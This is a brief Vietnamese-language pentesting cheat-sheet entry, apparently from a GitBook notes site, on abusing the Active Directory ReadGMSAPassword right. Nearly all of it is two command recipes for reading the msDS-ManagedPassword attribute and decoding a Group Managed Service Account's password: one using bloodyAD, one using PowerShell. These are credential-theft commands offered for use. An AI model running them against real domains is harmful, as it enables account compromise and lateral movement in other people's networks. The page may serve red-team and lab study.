# ReadGMSAPassword

Trích xuất mật khẩu của Group Managed Service Account (GMSA) từ Active Directory

#### Windows/Linux

{% code overflow="wrap" %}

```
bloodyAD -u <user> -d <domain> -p <pass> --host <ip> get object '<gmsaaccount>$' --attr msDS-ManagedPassword
```

{% endcode %}

#### Windows Only

{% code overflow="wrap" %}

```
$gmsa = Get-ADServiceAccount -Identity '<gmsaaccount>' -Properties 'msDS-ManagedPassword'
$mp = $gmsa.'msDS-ManagedPassword'
ConvertFrom-ADManagedPasswordBlob $mp
```

{% endcode %}
